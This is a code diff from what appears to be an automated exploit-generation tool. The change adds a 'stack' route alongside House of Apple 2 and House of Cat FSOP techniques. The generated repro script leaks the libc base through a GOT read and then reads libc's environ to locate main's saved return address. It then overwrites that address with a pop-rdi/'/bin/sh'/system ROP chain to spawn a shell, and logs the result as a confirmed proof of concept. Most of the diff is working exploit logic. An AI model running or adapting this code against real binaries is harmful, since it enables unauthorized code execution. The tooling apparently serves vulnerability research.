@@ -1121,11 +1121,12 @@ def _www_shell(ctx, target, target_bytes, lead, vclass, *, exe, opts, model, wid
                 res = _leak.indexed_write_fsop(
                     Path(exe), Path(exe).parent, write_cell=_w, read_cell=_r,
                     libc_data=libc_data, leak_slots=slots, scratch=base,
-                    scratch_size=int(arr.get("size") or 0), exit_seqs=exits)
+                    scratch_size=int(arr.get("size") or 0), exit_seqs=exits,
+                    target_bytes=target_bytes)
                 if res.get("ok"):
-                    ctx.progress(msg=f"indexed-write FSOP ({res.get('plan')}): option {writer} "
-                                     f"wrote {len(res.get('cells') or ())} House-of-Apple-2 cells "
-                                     f"over {res['fp_name']} (libc {res['libc_base']:#x} leaked "
+                    ctx.progress(msg=f"indexed-write ({res.get('plan')}): option {writer} wrote "
+                                     f"{len(res.get('cells') or ())} words over "
+                                     f"{res['fp_name']} (libc {res['libc_base']:#x} leaked "
                                      f"through option {reader}) -> shell")
                     return _file_www_l3(ctx, target, lead, vclass, res, arr=arr, writer=writer,
                                         reader=reader, width=width, model=model)
@@ -1159,6 +1160,8 @@ def _www_repro_script(*, arr_name, arr_addr, stride, writer, reader, fields, rfi
             f"SCENTRY={int(T.get('setcontext') or 0):#x}; EXECVE={int(T.get('execve') or 0):#x}; "
             f"BINSH={int(T.get('binsh') or 0):#x}\n"
             f"GREGS={_json.dumps(T.get('fields') or {})}; RIP_AT={int(T.get('rip_at') or 0):#x}\n"
+            f"ENVIRON={int(T.get('environ') or 0):#x}; POP_RDI={int(T.get('pop_rdi') or 0):#x}; "
+            f"RETG={int(T.get('ret') or 0):#x}; ALIGN={bool(T.get('align'))!r}\n"
             f"LIST_ALL={int(T.get('list_all') or 0):#x}; FINISH={(T.get('plan') or 'system')!r}; "
             f"CAT={{'wide':{_heap.cat_offsets()['wide']:#x},'vt':{_heap.cat_offsets()['vt']:#x},"
             f"'lock':{_heap.cat_offsets()['lock']:#x},'size':{_heap.CAT_BLOB_MIN:#x}}}\n"
@@ -1211,9 +1214,38 @@ def _www_repro_script(*, arr_name, arr_addr, stride, writer, reader, fields, rfi
             "    if base: break\n"
             "assert base, 'no GOT read resolved a page-aligned libc base'\n"
             "print('libc base %#x' % base)\n"
-            "fp=base+S['_IO_2_1_stderr_']\n"
-            "wide=next(v for v in rd(fp+F['wide']) if base<=v<base+0x600000)\n"
-            "if PLAN=='cat':\n"
+            "if PLAN!='stack':\n"
+            "    fp=base+S['_IO_2_1_stderr_']\n"
+            "    wide=next(v for v in rd(fp+F['wide']) if base<=v<base+0x600000)\n"
+            "if PLAN=='stack':\n"
+            "    # No FILE and no allocator: libc exports `environ`, whose VALUE is the envp array\n"
+            "    # the kernel left on the stack, so one read turns the arbitrary read into a stack\n"
+            "    # address. Main's saved return address is the first libc CODE pointer below it\n"
+            "    # that is not inside __libc_start_main -- the two libc return addresses above\n"
+            "    # main's both belong to frames that are never returned from (__libc_start_main\n"
+            "    # calls __libc_start_call_main, which is noreturn), and main's own points into\n"
+            "    # __libc_start_call_main, which no libc exports. Re-derived here, not baked in.\n"
+            "    tx=re.search(r'\\.text\\s+\\S+\\s+([0-9a-f]+)\\s+\\S+\\s+([0-9a-f]+)',\n"
+            "                 run('readelf','-SW',libc))\n"
+            "    TLO,TSZ=int(tx.group(1),16),int(tx.group(2),16)\n"
+            "    lsm=re.search(r'([0-9a-f]+)\\s+(\\d+)\\s+FUNC\\s+\\S+\\s+\\S+\\s+\\S+\\s+"
+            "__libc_start_main', run('readelf','-sW',libc))\n"
+            "    LSM=(int(lsm.group(1),16), int(lsm.group(2))) if lsm else (0,0)\n"
+            "    stack=next(v for v in rd(base+ENVIRON) if 0x7f0000000000<v<0x800000000000)\n"
+            "    print('environ -> stack %#x' % stack)\n"
+            "    slot=None\n"
+            "    for a in range((stack&~7), (stack&~7)-0x400, -8):\n"
+            "        vs=rd(a)\n"
+            "        if not vs: continue\n"
+            "        v=vs[-1]\n"
+            "        if not (base+TLO <= v < base+TLO+TSZ): continue\n"
+            "        if base+LSM[0] <= v < base+LSM[0]+max(LSM[1],1): continue\n"
+            "        slot=a; print(\"main's saved return %#x = libc+%#x\" % (a, v-base)); break\n"
+            "    assert slot, 'no saved return address into libc below environ'\n"
+            "    chain=([base+RETG] if ALIGN else [])+[base+POP_RDI, base+BINSH, base+S['system']]\n"
+            "    for k,w in enumerate(chain): wr(slot+8*k, w)\n"
+            "    assert [rd(slot+8*k)[-1] for k in range(len(chain))]==chain, 'chain did not land'\n"
+            "elif PLAN=='cat':\n"
             "    # House of Cat: do not forge a FILE glibc owns. Build the whole FILE, its\n"
             "    # _IO_wide_data and its fake _wide_vtable inside the target's own array, then\n"
             "    # write ONE pointer -- _IO_list_all := &array. _mode is 1 so the flush test\n"
@@ -1277,37 +1309,50 @@ def _file_www_l3(ctx, target, lead, vclass, res, *, arr, writer, reader, width, 
                                stride=arr.get("stride", 8) or 8, writer=writer, reader=reader,
                                fields=model[writer], rfields=model[reader], width=width,
                                exits=exits, plan=plan, targets=res.get("targets"))
-    # What the forged FILE's overflow actually ends up calling, per plan.
+    # What the hijack actually ends up calling, per plan.
     finish = res.get("finish") or plan
-    effect = ('execve("/bin/sh", NULL, NULL) through setcontext'
-              if finish == "setcontext" else 'system(" /bin/sh")')
+    effect = ('execve("/bin/sh", NULL, NULL) through setcontext' if finish == "setcontext"
+              else 'system("/bin/sh")' if plan == "stack" else 'system(" /bin/sh")')
+    # The stack plan is not FSOP at all, so it gets its own name and its own description of HOW.
+    route = ("the environ route (main's saved return address)" if plan == "stack"
+             else "House of Apple 2")
+    how = (f"option {reader} read libc's `environ` through the unchecked index to disclose a "
+           f"stack address, walked down it for MAIN's saved return address (the first libc code "
+           f"pointer that is not inside __libc_start_main), and option {writer} wrote a "
+           f"{len(res.get('cells') or ())}-word system(\"/bin/sh\") chain over it; returning "
+           f"from main ran the chain"
+           if plan == "stack" else
+           f"option {reader} read {res['fp_name']}'s own _wide_data; option {writer} wrote "
+           f"{len(res.get('cells') or ())} House-of-Apple-2 cells ({plan} plan) over that FILE "
+           f"through {arr['name']}, with the fake wide jump table placed inside {arr['name']} "
+           f"itself; exit() flushed the forged FILE and its _IO_wfile_overflow called {effect}")
     input_sha = ctx.put_artifact("www-fsop-repro", data=script)
     meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
-            "exploit": f"{vclass}->House of Apple 2/{plan} (no win, libc leaked in band)",
+            "exploit": f"{vclass}->{route}/{plan} (no win, libc leaked in band)",
             "libc_base": hex(res["libc_base"]), "forged": res["fp_name"],
             "tool_version": TOOL_VERSION}
     data = bundle.build(ctx.content.path(target.sha256).read_bytes(), script, meta, b"",
                         "stdin", [], None,
                         primitive={"type": vclass, "target": effect, "offset": None,
-                                   "confirmed": True, "note": "write-what-where -> FSOP"})
+                                   "confirmed": True,
+                                   "note": f"write-what-where -> {route}"})
     bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
     poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
                                      signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
     eff = (f"working exploit ({vclass} -> arbitrary write -> code execution) with NO win function "
            f"and no system() in the target's PLT: option {reader} read a GOT slot through the "
-           f"unchecked index to recover the libc base ({res['libc_base']:#x}, ASLR on) and then "
-           f"{res['fp_name']}'s own _wide_data; option {writer} wrote {len(res.get('cells') or ())} "
-           f"House-of-Apple-2 cells ({plan} plan) over that FILE through {arr['name']}, with the "
-           f"fake wide jump table placed inside {arr['name']} itself; exit() flushed the forged "
-           f"FILE and its _IO_wfile_overflow called {effect}. Confirmed by a shell that echoed "
-           f"our marker -- every cell read back before the trigger, all in ONE process.")
+           f"unchecked index to recover the libc base ({res['libc_base']:#x}, ASLR on); then "
+           f"{how}, calling {effect}. Confirmed by a shell that echoed our marker -- every cell "
+           f"read back before the trigger, all in ONE process.")
     fd = FindingDAO(ctx.conn)
-    cand = {"cwe": lead.cwe, "title": "Code execution (demonstrated): L3 arbitrary write -> FSOP",
+    cand = {"cwe": lead.cwe,
+            "title": "Code execution (demonstrated): L3 arbitrary write -> "
+                     + ("saved return address" if plan == "stack" else "FSOP"),
             "severity": "critical", "detector": "chain_primitive", "state": "poc-backed",
             "confidence": 0.99, "authoritative": True, "title_only": True,
             "dedup_key": f"chain:{vclass}:fsop:{target.id}", "site_detail": arr["name"],
             "evidence": [{"channel": "effects", "detail": _json.dumps([{
-                "kind": "rce", "title": "Arbitrary write -> FSOP shell (no win function)",
+                "kind": "rce", "title": f"Arbitrary write -> {route} shell (no win function)",
                 "status": "demonstrated", "detail": eff,
                 "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": input_sha,
                           "note": eff, "shell": True}}])}]}
@@ -1320,7 +1365,7 @@ def _file_www_l3(ctx, target, lead, vclass, res, *, arr, writer, reader, width, 
              "win": None, "exploit": "www-fsop", "shell": True, "writer": writer, "reader": reader,
              "libc_base": hex(res["libc_base"]), "forged": res["fp_name"], "cells": res["cells"],
              "bundle": bundle_sha})
-    ctx.progress(pct=100, msg=f'L3 CONFIRMED: {vclass} -> FSOP -> system("/bin/sh") (no win)')
+    ctx.progress(pct=100, msg=f"L3 CONFIRMED: {vclass} -> {route} -> {effect} (no win)")
     return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
             "metrics": {"chained": True, "level": "L3", "vclass": vclass, "shell": True,
                         "exploit": "www-fsop"}}
